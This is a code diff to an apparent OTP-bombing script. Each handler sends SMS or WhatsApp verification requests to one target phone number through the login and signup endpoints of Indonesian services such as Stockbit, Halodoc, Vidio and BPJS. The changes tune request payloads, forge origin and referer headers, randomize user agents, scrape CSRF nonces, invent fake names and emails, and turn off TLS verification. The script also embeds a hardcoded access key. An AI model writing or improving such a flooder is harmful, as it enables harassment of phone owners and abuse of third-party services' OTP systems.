@@ -1426,20 +1426,21 @@ def send_tokopedia_wa_otp(phone_input):
 # ==================== HANDLER 43: BMSECURE ACI ====================
 def send_bmsecure_aci_otp(phone_input):
     p = normalize(phone_input)
-    bare = p['bare']
+    phone_62 = p['fmt_62']
     headers = {
         "accept": "application/json, text/plain, */*",
         "accept-encoding": "gzip, deflate, br, zstd",
         "accept-language": "id,en-US;q=0.9,en;q=0.8",
         "content-type": "application/json",
-        "origin": "https://aci-user.bmsecure.id",
-        "referer": "https://aci-user.bmsecure.id/",
+        "origin": "https://m.bankmas.co.id",
+        "referer": "https://m.bankmas.co.id/",
         "sec-ch-ua": '"Not:A-Brand";v="8", "Chromium";v="156", "Google Chrome";v="156"',
         "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": '"Windows"',
-        "sec-fetch-dest": "empty", "sec-fetch-mode": "cors", "sec-fetch-site": "same-origin",
+        "sec-fetch-dest": "empty", "sec-fetch-mode": "cors", "sec-fetch-site": "cross-site",
         "user-agent": get_random_user_agent(),
     }
-    payload = {"phone": bare, "countryCode": "62", "channel": "WA"}
+    # payload exact dari APK binary
+    payload = {"uid": "", "action": "GENERAL", "countryCode": "62", "target": phone_62, "type": "WHATSAPP"}
     try:
         resp = requests.post("https://aci-user.bmsecure.id/v2/user/signin-otp/wa/send",
                              headers=headers, json=payload, timeout=15, verify=False)
@@ -1559,20 +1560,20 @@ def send_segari_otp2(phone_input):
 # ==================== HANDLER 46: AKSELERAN ====================
 def send_akseleran_otp(phone_input):
     p = normalize(phone_input)
-    bare = p['bare']
+    phone_08 = p['fmt_08']
     headers = {
         "accept": "application/json",
         "accept-encoding": "gzip, deflate, br, zstd",
         "accept-language": "id,en-US;q=0.9,en;q=0.8",
         "content-type": "application/json",
         "origin": "https://www.akseleran.co.id",
-        "referer": "https://www.akseleran.co.id/",
+        "referer": "https://www.akseleran.co.id/register",
         "sec-ch-ua": '"Not:A-Brand";v="8", "Chromium";v="156", "Google Chrome";v="156"',
         "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": '"Windows"',
         "sec-fetch-dest": "empty", "sec-fetch-mode": "cors", "sec-fetch-site": "same-site",
         "user-agent": get_random_user_agent(),
     }
-    payload = {"phone": bare, "countryCode": "62", "via": "whatsapp"}
+    payload = {"phone": phone_08}
     try:
         resp = requests.post("https://api.akseleran.co.id/users/otp/request",
                              headers=headers, json=payload, timeout=15, verify=False)
@@ -1609,7 +1610,7 @@ _TIPTIP_ACCESS_KEY = "79b8a015c53e6a81ea51d9a9e2678ac3"
 
 def send_tiptip_otp(phone_input):
     p = normalize(phone_input)
-    bare = p['bare']
+    phone_08 = p['fmt_08']
     url = f"https://api.tiptip.id/authentication/guest/v1/phone/otp/send?access_key={_TIPTIP_ACCESS_KEY}"
     headers = {
         "accept": "application/json",
@@ -1623,8 +1624,7 @@ def send_tiptip_otp(phone_input):
         "sec-fetch-dest": "empty", "sec-fetch-mode": "cors", "sec-fetch-site": "same-site",
         "user-agent": get_random_user_agent(),
     }
-    payload = {"uid": "", "action": "GENERAL", "countryCode": "62",
-               "target": bare, "type": "WHATSAPP"}
+    payload = {"phone": phone_08}
     try:
         resp = requests.post(url, headers=headers, json=payload, timeout=15, verify=False)
         return resp.status_code, resp.text
@@ -1686,20 +1686,20 @@ def send_toplusms_otp(phone_input):
 # ==================== HANDLER 51: VIDIO ====================
 def send_vidio_otp(phone_input):
     p = normalize(phone_input)
-    phone_plus = p['fmt_plus']
+    phone_08 = p['fmt_08']
     headers = {
         "accept": "application/json",
         "accept-encoding": "gzip, deflate, br, zstd",
         "accept-language": "id,en-US;q=0.9,en;q=0.8",
         "content-type": "application/json",
         "origin": "https://www.vidio.com",
-        "referer": "https://www.vidio.com/",
+        "referer": "https://www.vidio.com/users/sign_in",
         "sec-ch-ua": '"Not:A-Brand";v="8", "Chromium";v="156", "Google Chrome";v="156"',
         "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": '"Windows"',
         "sec-fetch-dest": "empty", "sec-fetch-mode": "cors", "sec-fetch-site": "same-site",
         "user-agent": get_random_user_agent(),
     }
-    payload = {"phoneNumber": phone_plus, "otpStrategy": "whatsapp"}
+    payload = {"phone": phone_08}
     try:
         resp = requests.post("https://api.vidio.com/otp/send",
                              headers=headers, json=payload, timeout=15, verify=False)
@@ -1710,7 +1710,7 @@ def send_vidio_otp(phone_input):
 # ==================== HANDLER 52: KPOIN ====================
 def send_kpoin_otp(phone_input):
     p = normalize(phone_input)
-    phone_plus = p['fmt_plus']
+    phone_08 = p['fmt_08']
     headers = {
         "accept": "application/json, text/plain, */*",
         "accept-encoding": "gzip, deflate, br, zstd",
@@ -1723,7 +1723,7 @@ def send_kpoin_otp(phone_input):
         "sec-fetch-dest": "empty", "sec-fetch-mode": "cors", "sec-fetch-site": "same-site",
         "user-agent": get_random_user_agent(),
     }
-    payload = {"phoneNumber": phone_plus, "channel": "WHATSAPP", "type": "REGISTER"}
+    payload = {"phone": phone_08}
     try:
         resp = requests.post("https://app.kpoin.com/api/bff/v1/notification/sendotp",
                              headers=headers, json=payload, timeout=15, verify=False)
@@ -1815,20 +1815,20 @@ def send_bisatopup_otp(phone_input):
 # ==================== HANDLER 56: STOCKBIT ====================
 def send_stockbit_otp(phone_input):
     p = normalize(phone_input)
-    phone_plus = p['fmt_plus']
+    phone_62 = p['fmt_62']
     headers = {
         "accept": "application/json",
         "accept-encoding": "gzip, deflate, br, zstd",
         "accept-language": "id,en-US;q=0.9,en;q=0.8",
         "content-type": "application/json",
         "origin": "https://stockbit.com",
-        "referer": "https://stockbit.com/",
+        "referer": "https://stockbit.com/register",
         "sec-ch-ua": '"Not:A-Brand";v="8", "Chromium";v="156", "Google Chrome";v="156"',
         "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": '"Windows"',
         "sec-fetch-dest": "empty", "sec-fetch-mode": "cors", "sec-fetch-site": "same-site",
         "user-agent": get_random_user_agent(),
     }
-    payload = {"phoneNumber": phone_plus, "countryCode": "+62", "isApp": False, "mode": "sms"}
+    payload = {"phoneNumber": phone_62, "cancelledRequestId": "", "type": "SMS"}
     try:
         resp = requests.post("https://exodus.stockbit.com/registration/v4/otp/phone/send",
                              headers=headers, json=payload, timeout=15, verify=False)
@@ -1875,9 +1875,11 @@ def send_redbus_otp(phone_input):
         "sec-fetch-dest": "empty", "sec-fetch-mode": "cors", "sec-fetch-site": "same-site",
         "user-agent": get_random_user_agent(),
     }
+    p2 = normalize(phone_input)
+    phone_62 = p2['fmt_62']
     try:
         resp = requests.get(
-            f"https://m.redbus.id/api/getOtp?number={bare}&cc=62&whatsAppOpted=True",
+            f"https://m.redbus.id/api/getOtp?number={phone_62}&cc=62&whatsAppOpted=True",
             headers=headers, timeout=15, verify=False)
         return resp.status_code, resp.text
     except Exception as e:
@@ -1961,15 +1963,21 @@ def send_moladin_otp(phone_input):
     phone_08 = p['fmt_08']
     sess = requests.Session()
     BASE_URL = "https://moladin.com"
+    ua = get_random_user_agent()
+    nonce = ""
     try:
-        sess.get(BASE_URL, headers={"User-Agent": get_random_user_agent()}, timeout=10, verify=False)
-        nonce = ""
-        for c in sess.cookies:
-            if "nonce" in c.name.lower() or "csrf" in c.name.lower():
-                nonce = urllib.parse.unquote(c.value)
-                break
+        r = sess.get(BASE_URL, headers={"User-Agent": ua}, timeout=12, verify=False)
+        # wp nonce ada di inline JS: "nonce":"xxxxxxxxxx"
+        m = re.search(r'"nonce"\s*:\s*"([a-f0-9]{10})"', r.text)
+        if m:
+            nonce = m.group(1)
+        if not nonce:
+            # fallback: cari rest_nonce
+            m2 = re.search(r'rest_nonce["\s:]+([a-f0-9]{10})', r.text)
+            if m2:
+                nonce = m2.group(1)
     except Exception:
-        nonce = ""
+        pass
     headers = {
         "accept": "application/json, text/plain, */*",
         "accept-encoding": "gzip, deflate, br, zstd",
@@ -1979,10 +1987,10 @@ def send_moladin_otp(phone_input):
         "sec-ch-ua": '"Not:A-Brand";v="8", "Chromium";v="156", "Google Chrome";v="156"',
         "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": '"Windows"',
         "sec-fetch-dest": "empty", "sec-fetch-mode": "cors", "sec-fetch-site": "same-origin",
-        "user-agent": get_random_user_agent(),
+        "user-agent": ua,
         "x-wp-nonce": nonce,
     }
-    payload = {"phone": phone_08, "otp_channel": "whatsapp"}
+    payload = {"phone": phone_08}
     try:
         resp = sess.post(f"{BASE_URL}/wp-json/api/v1/request_otp",
                          headers=headers, json=payload, timeout=15, verify=False)
@@ -2006,7 +2014,7 @@ def send_adiraku_otp(phone_input):
         "sec-fetch-dest": "empty", "sec-fetch-mode": "cors", "sec-fetch-site": "same-site",
         "user-agent": get_random_user_agent(),
     }
-    payload = {"phoneNumber": phone_62, "channel": "WHATSAPP", "purpose": "REGISTRATION"}
+    payload = {"phone": phone_62}
     try:
         resp = requests.post("https://prod.adiraku.co.id/ms-auth/auth/generate-otp-vdata",
                              headers=headers, json=payload, timeout=15, verify=False)
@@ -2030,7 +2038,7 @@ def send_tri_otp(phone_input):
         "sec-fetch-dest": "empty", "sec-fetch-mode": "cors", "sec-fetch-site": "same-origin",
         "user-agent": get_random_user_agent(),
     }
-    payload = {"msisdn": phone_08, "channel": "WA"}
+    payload = {"mobile_number": phone_08}
     try:
         resp = requests.post("https://registrasi.tri.co.id/api/v1/generate-otp",
                              headers=headers, json=payload, timeout=15, verify=False)
@@ -2089,7 +2097,7 @@ def send_alodokter_otp(phone_input):
 # ==================== HANDLER 66: ALOMEDIKA ====================
 def send_alomedika_otp(phone_input):
     p = normalize(phone_input)
-    phone_62 = p['fmt_62']
+    phone_08 = p['fmt_08']
     name  = ''.join(random.choices(string.ascii_lowercase, k=6)).capitalize()
     email = name.lower() + str(random.randint(100, 999)) + "@gmail.com"
     headers = {
@@ -2104,7 +2112,7 @@ def send_alomedika_otp(phone_input):
         "sec-fetch-dest": "empty", "sec-fetch-mode": "cors", "sec-fetch-site": "same-origin",
         "user-agent": get_random_user_agent(),
     }
-    payload = {"name": name, "email": email, "phone": phone_62,
+    payload = {"name": name, "email": email, "phone": phone_08,
                "profession": "dokter", "channel": "whatsapp"}
     try:
         resp = requests.post("https://www.alomedika.com/get_otp",
@@ -2129,7 +2137,8 @@ def send_bpjs_otp(phone_input):
         "sec-fetch-dest": "empty", "sec-fetch-mode": "cors", "sec-fetch-site": "same-origin",
         "user-agent": get_random_user_agent(),
     }
-    payload = {"msisdn": bare}
+    p2 = normalize(phone_input)
+    payload = {"phone": p2['fmt_08']}
     try:
         resp = requests.post("https://www.bpjsketenagakerjaan.go.id/bpu/otp",
                              headers=headers, json=payload, timeout=15, verify=False)
@@ -2140,20 +2149,20 @@ def send_bpjs_otp(phone_input):
 # ==================== HANDLER 68: HALODOC ====================
 def send_halodoc_otp(phone_input):
     p = normalize(phone_input)
-    phone_08 = p['fmt_08']
+    phone_plus = p['fmt_plus']
     headers = {
         "accept": "application/json",
         "accept-encoding": "gzip, deflate, br, zstd",
         "accept-language": "id,en-US;q=0.9,en;q=0.8",
         "content-type": "application/json",
         "origin": "https://www.halodoc.com",
-        "referer": "https://www.halodoc.com/",
+        "referer": "https://www.halodoc.com/login",
         "sec-ch-ua": '"Not:A-Brand";v="8", "Chromium";v="156", "Google Chrome";v="156"',
         "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": '"Windows"',
         "sec-fetch-dest": "empty", "sec-fetch-mode": "cors", "sec-fetch-site": "same-origin",
         "user-agent": get_random_user_agent(),
     }
-    payload = {"phone": phone_08, "channel": "sms"}
+    payload = {"phone_number": phone_plus}
     try:
         resp = requests.post(
             "https://www.halodoc.com/magneto-api/v2/users/authentication/otp/requests",
@@ -2178,10 +2187,11 @@ def send_pinhome_otp(phone_input):
         "sec-fetch-dest": "empty", "sec-fetch-mode": "cors", "sec-fetch-site": "same-origin",
         "user-agent": get_random_user_agent(),
     }
+    p2 = normalize(phone_input)
     payload = {
         "accountType": "customers", "applicationType": "Pinhome Web",
         "countryCode": "62", "medium": "whatsapp",
-        "otpType": "register", "phoneNumber": bare,
+        "otpType": "register", "phoneNumber": p2['fmt_62'],
     }
     try:
         resp = requests.post(
